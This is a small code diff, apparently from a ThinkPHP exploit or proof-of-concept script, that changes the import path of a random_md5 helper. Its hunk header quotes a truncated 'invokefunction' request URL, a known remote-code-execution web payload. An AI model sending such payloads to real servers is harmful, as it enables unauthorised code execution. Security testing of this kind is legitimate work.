@@ -4,7 +4,7 @@ GET  http://your-ip:8080/index.php?s=/Index/\think\app/invokefunction&function=c
 
 import requests
 
-from lib.core.md5 import random_md5
+from lib.md5 import random_md5
 
 random_string, random_md5 = random_md5()
 
